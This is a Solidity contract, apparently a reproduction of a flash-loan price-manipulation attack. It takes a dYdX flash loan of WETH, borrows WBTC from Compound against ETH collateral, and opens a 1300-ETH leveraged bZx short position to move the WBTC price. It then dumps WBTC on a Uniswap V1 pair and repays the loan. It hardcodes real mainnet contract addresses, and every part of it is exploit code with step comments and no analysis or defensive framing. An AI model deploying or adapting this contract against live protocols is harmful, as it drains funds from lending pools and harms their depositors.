// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import './Dydx/ISoloMargin.sol';
import './Dydx/DydxFlashloanBase.sol';
import './Compound/ICToken.sol';
import './Compound/ICEther.sol';
import './Compound/IComptroller.sol';
import './Compound/ICompoundPriceOracle.sol';
import './Bzx/IPositionTokenV2.sol';
import './UniswapV1/IUniswapV1Pair.sol';
import './ERC20/IERC20.sol';

interface IWETH {
    function balanceOf(address owner) external returns (uint256);

    function approve(address guy, uint wad) external returns (bool);

    function transfer(address dst, uint256 wad) external returns (bool);

    function deposit() external payable;

    function withdraw(uint256 wad) external;
}

contract Luck is DydxFlashloanBase {

    // Compound CTokens
    address constant private cwbtc = 0xC11b1268C1A384e55C48c2391d8d480264A3A7F4;
    address constant private ceth = 0x4Ddc2D193948926D02f9B1fE9e1daa0718270ED5;
    address constant private unitroller = 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B;
    address constant private comp_oracle = 0x1D8aEdc9E924730DD3f9641CDb4D1B92B848b4bd;

    address constant private dydxSoloMargin = 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e;
    address constant private weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant private wbtc = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;

    address constant private sETHwBTC5x = 0xb0200B0677dD825bb32B93d055eBb9dc3521db9D;

    address constant private uniV1_wbtc_pair = 0x4d2f5cFbA55AE412221182D8475bC85799A5644b;

    constructor() public {}

    struct MyCustomData{
        address token;
        uint256 repayAmount;
    }


    // Step 1: Flashloan in dydx
    function prepare(uint256 _amount) external {
        ISoloMargin solo = ISoloMargin(dydxSoloMargin);     

        uint256 marketId = _getMarketIdFromTokenAddress(dydxSoloMargin, weth);  
        uint256 repayAmount = _getRepaymentAmountInternal(_amount); 
        IWETH(weth).approve(dydxSoloMargin, repayAmount);

        Account.Info[] memory accountInfos = new Account.Info[](1);
        accountInfos[0] = _getAccountInfo();

        Actions.ActionArgs[] memory operations = new Actions.ActionArgs[](3);

        operations[0] = _getWithdrawAction(marketId, _amount);
        operations[1] = _getCallAction(
            abi.encode(MyCustomData({token: weth, repayAmount: repayAmount}))
        );
        operations[2] = _getDepositAction(marketId, repayAmount);
        
        solo.operate(accountInfos, operations);
        payable(msg.sender).transfer(address(this).balance);
    }

    function callFunction(
        address sender,
        Account.Info memory accountInfo,
        bytes memory data
    ) external {
        MyCustomData memory mcd = abi.decode(data, (MyCustomData));

        IWETH(weth).withdraw(IWETH(weth).balanceOf(address(this)));
        // Step 2: Borrow in Compound
        _borrowFromCompound(5500 ether);

        // Step 3: Margin trade in bZx
        IPositionToken(sETHwBTC5x).mintWithEther{value: 1300 ether}(address(this), 0);
        
        
        uint256 bal_wbtc = IERC20(wbtc).balanceOf(address(this));
        IERC20(wbtc).approve(uniV1_wbtc_pair, type(uint).max);
        IUniswapV1Pair(uniV1_wbtc_pair).tokenToEthSwapInput(bal_wbtc, 1, block.timestamp + 120);

        IWETH(weth).deposit{value: mcd.repayAmount + 2}();

        // ICEther(ceth).redeem(redeemTokens);

        uint256 balOfLoanedToken = IERC20(mcd.token).balanceOf(address(this));
        require(
            balOfLoanedToken >= mcd.repayAmount,
            "Not enough funds to repay dydx loan!"
        );
    }

    // Step 2: Borrow in Compound
    function _borrowFromCompound(uint _amount) private returns(uint256) {

        // step 2-1: supply eth as collateral, get ceth in return 
        ICEther(ceth).mint{value: _amount}();

        // step 2-2: enter the eth market, so you can borrow another type of asset
        address[] memory cTokens = new address[](1);
        cTokens[0] = ceth;
        uint256[] memory errors = IComptroller(unitroller).enterMarkets(cTokens);
        if (errors[0] != 0) {
            revert("Compound.enterMarkets failed.");
        }

        // // step 2-3: get account's total liquidity value in Compound
        (uint256 e, uint256 liquidity, uint256 shortfall) = 
            IComptroller(unitroller).getAccountLiquidity(address(this));
        if (e != 0) {
            revert("Comptroller.getAccountLiquidity failed.");
        }
        require(shortfall == 0, "account underwater.");
        require(liquidity > 0, "account has excess collateral.");

        // // step 2-4: get max amount can be borrowed from compound
        // // get the underlying price in USD
        //    Get the most recent price for a token in USD with 18 decimals of precision.
        uint256 underlyingPrice = ICompoundPriceOracle(comp_oracle).getUnderlyingPrice(cwbtc);
        uint256 maxBorrowUnderlying = liquidity * 1e18 / underlyingPrice;
        // get underlying token's decimals (wbtc) = 8
        // uint256 _underlyingDecimals = IERC20(ICToken(cwbtc).underlying()).decimals();
        uint256 _underlyingDecimals = 8;
        uint256 borrowAmount = ICToken(cwbtc).borrow(maxBorrowUnderlying / (10 ** _underlyingDecimals));

        return borrowAmount;
    }

    receive() external payable {}
}